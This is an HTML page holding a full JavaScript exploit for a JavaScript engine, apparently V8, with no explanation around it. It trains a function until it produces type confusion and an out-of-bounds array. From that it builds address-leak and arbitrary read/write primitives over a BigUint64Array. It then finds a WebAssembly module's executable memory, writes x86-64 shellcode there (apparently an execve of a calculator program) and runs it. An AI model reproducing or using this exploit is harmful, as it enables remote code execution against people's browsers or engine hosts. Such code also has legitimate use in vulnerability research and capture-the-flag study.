<body>
<script>

function console(msg){
	document.body.innerText += msg + '\n';
}
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	return bigUint64[0]; 
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}

function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function foo(a, b) {
	let tmp = {};
	b[0] = 0;
	a.length;
	for(let i = 0; i < a.length; i++){
		a[i] = tmp;
	}
	let o = [1.1];
	b[15] = 4.063e-320;
	return o;
}

var arr_addr_of = new Array(1);
arr_addr_of[0] = 'a';
for(let i = 0; i < 10000; i++) {
	eval(`var tmp_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];`);
	foo(arr_addr_of, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
	foo(tmp_arr, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
}

gc();

var float_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];
var oob_array = foo(float_arr, float_arr, {});

var obj_array = {mark: 0xdead, obj: arr_addr_of};
var big_array = new BigUint64Array(6);
big_array[0] = 0x1234n;
big_array[1] = 0xaabbn;

console("[+] oob_array length: " + hex(oob_array.length));

var obj_idx = 0;
for(let i = 0; i < 0x500; i++)
{
	let tmp = f2half(oob_array[i]);
	if(tmp[1] == (0xdead << 1)){
		obj_idx = i+1;
		break;
	}
}

console("[+] obj_idx: 0x"+ hex(obj_idx));

var external_pointer_idx = 0;
var base_pointer_idx = 0;
var bigarray_len_idx = 0;

for(let i=0; i < 0x500; i++)
{
	if(f2i(oob_array[i]) == 0x1234n){
		bigarray_len_idx = i + 10;
		console("[+] find bigarray length : 0x" + hex(f2i(oob_array[bigarray_len_idx])));
		external_pointer_idx = i + 11;
		external_pointer = f2i(oob_array[external_pointer_idx]);
		console("[+] find external_pointer : 0x" + hex(external_pointer));
		base_pointer_idx = i + 12;
		base_pointer = f2i(oob_array[base_pointer_idx]);
		console("[+] find base_pointer : 0x" + hex(base_pointer));
		break;
	}
}

var highaddr = f2i(oob_array[external_pointer_idx]) & 0xffffffff00000000n;
console("[+] highaddr : 0x" + hex(highaddr));

function heap_read(addr)
{
	oob_array[base_pointer_idx] = i2f(addr-0x8n);
	let ret = big_array[0];
	return ret;
}

function arb_read(addr)
{
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
	let ret = big_array[0];
        return ret;

}

function arb_write(addr, payload)
{
	sc = ByteToBigIntArray(payload);
	oob_array[bigarray_len_idx] = i2f(BigInt(sc.length));
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);

	for(let i = 0; i < sc.length; i++) {
        	big_array[i] = sc[i];
   	}
}

function arb_write64(addr, payload)
{
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
        big_array[0] = payload;
}

function addr_of(obj)
{
	obj_array.obj = obj;
	let addr = f2half(oob_array[obj_idx]);
	let obj_addr = addr[0];
	return BigInt(obj_addr);
}

function wasm_func() {
        var wasmImports = {
            env: {
                puts: function puts (index) {
                    print(utf8ToString(h, index));
                }
            }
        };

        var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
            96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
            116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
            131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
            109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
            128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
            65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
        let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
        let h = new Uint8Array(m.exports.memory.buffer);
        return m.exports.hello;
}

var wasm_function = wasm_func();

var wasm_function_addr = addr_of(wasm_function);
console("[+] wasm_function_addr : 0x" + hex(wasm_function_addr));

var wasm_shared_info = heap_read(wasm_function_addr+0xcn) & (0xffffffffn);
console("[+] wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_data = heap_read(wasm_shared_info+0x4n) &(0xffffffffn);
console("[+] wasm_data : 0x" + hex(wasm_data));

var wasm_instance = heap_read(wasm_data+0x8n) &(0xffffffffn);
console("[+] wasm_instance : 0x" + hex(wasm_instance));

var wasm_rwx = heap_read(wasm_instance+0x68n);
console("[+] wasm_rwx : 0x" + hex(wasm_rwx));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

arb_write(wasm_rwx, shellcode);

wasm_function();

</script>
</body>
